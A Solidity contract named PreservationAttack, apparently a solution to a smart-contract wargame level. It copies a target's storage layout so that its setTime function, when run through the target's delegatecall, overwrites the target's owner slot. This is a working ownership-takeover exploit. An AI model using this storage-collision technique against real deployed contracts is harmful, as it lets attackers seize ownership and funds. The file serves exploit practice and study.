pragma solidity ^0.6.0;

contract PreservationAttack {
    address preservation;
    address _;
    address owner;

    constructor(address _preservation) public {
        preservation = _preservation;
    }

    function setTime(uint _time) public {
        owner = address(_time);
    }
}
